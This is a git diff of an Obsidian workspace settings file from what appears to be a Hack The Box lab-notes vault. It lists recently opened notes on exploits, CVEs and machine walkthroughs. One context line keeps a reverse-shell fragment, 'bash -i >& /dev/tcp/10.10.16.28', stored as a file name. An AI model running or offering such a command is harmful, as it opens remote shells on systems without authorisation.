@@ -59,11 +59,9 @@
             "id": "76cffbefb3737f65",
             "type": "leaf",
             "state": {
-              "type": "markdown",
+              "type": "image",
               "state": {
-                "file": "walkthrough/HTB-MonitorsTwo.md",
-                "mode": "source",
-                "source": false
+                "file": "HTB/_resources/4cab77b9c0d1dd2ce97b0d18b11dafd1.png"
               }
             }
           }
@@ -142,7 +140,7 @@
             "state": {
               "type": "backlink",
               "state": {
-                "file": "walkthrough/HTB-MonitorsTwo.md",
+                "file": "HTB/_resources/4cab77b9c0d1dd2ce97b0d18b11dafd1.png",
                 "collapseAll": false,
                 "extraContext": false,
                 "sortOrder": "alphabetical",
@@ -159,7 +157,7 @@
             "state": {
               "type": "outgoing-link",
               "state": {
-                "file": "walkthrough/HTB-MonitorsTwo.md",
+                "file": "HTB/_resources/4cab77b9c0d1dd2ce97b0d18b11dafd1.png",
                 "linksCollapsed": false,
                 "unlinkedCollapsed": true
               }
@@ -182,7 +180,7 @@
             "state": {
               "type": "outline",
               "state": {
-                "file": "walkthrough/HTB-MonitorsTwo.md"
+                "file": "HTB/_resources/4cab77b9c0d1dd2ce97b0d18b11dafd1.png"
               }
             }
           },
@@ -214,15 +212,34 @@
       "obsidian-excalidraw-plugin:Create new drawing": false
     }
   },
-  "active": "aa8f743586e9077b",
+  "active": "76cffbefb3737f65",
   "lastOpenFiles": [
+    "HTB/Excalidraw/MS-08-067.md",
+    "HTB/Excalidraw/MS-17-010.md",
+    "HTB/Excalidraw/MS08_067_2018.py.md",
+    "HTB/Excalidraw/msfvenom.md",
+    "HTB/Command.md",
+    "Watson.md",
+    "request-baskets Version1.21.md",
+    "puutygen.md",
+    "poc.py.md",
+    "Maltrail v0.53.md",
+    "KeePassXC.md",
+    "keepass.md",
+    "ImageMagick.md",
+    "git-dumper.md",
+    "drupalgeddon3.py.md",
+    "davtest.md",
+    "CVE-2023-32784.md",
+    "CVE-2014-6287.md",
+    "80.md",
+    "walkthrough/HTB-Zipping.md",
+    "walkthrough/HTB-Topology.md",
+    "walkthrough/HTB-Sau.md",
+    "walkthrough/HTB-Pilgrimage.md",
+    "walkthrough/HTB-PC.md",
+    "walkthrough/HTB-MonitorsTwo.md",
     "walkthrough/HTB-Legacy.excalidraw.md",
-    "walkthrough/HTB-Keeper.md",
-    "walkthrough/HTB-granny.excalidraw.md",
-    "walkthrough/HTB-Devel.excalidraw.md",
-    "walkthrough/HTB-CozyHosting.md",
-    "walkthrough/HTB-Bastard.excalidraw.md",
-    "walkthrough/HTB_blackfeild.md",
     "images/20230823060013.png",
     "images/20230908212530.png",
     "images/20230908212245.png",
@@ -233,26 +250,7 @@
     "images/20230908211122.png",
     "images/20230908210514.png",
     "images/20230908210045.png",
-    "images/Pasted.md",
-    "HTB/Excalidraw/msfvenom.md",
-    "HTB/Excalidraw/MS08_067_2018.py.md",
-    "HTB/Excalidraw/MS-17-010.md",
-    "HTB/Excalidraw/MS-08-067.md",
-    "80.md",
     "images",
-    "Watson.md",
-    "drupalgeddon3.py.md",
-    "davtest.md",
-    "CVE-2014-6287.md",
-    "Excalidraw/HTB-Bastard.excalidraw.md",
-    "Excalidraw/HTB_blackfeild.md",
-    "request-baskets Version1.21.md",
-    "puutygen.md",
-    "poc.py.md",
-    "Maltrail v0.53.md",
-    "KeePassXC.md",
-    "keepass.md",
-    "ImageMagick.md",
     "walkthrough",
     "pix",
     "bash -i >& /dev/tcp/10.10.16.28",
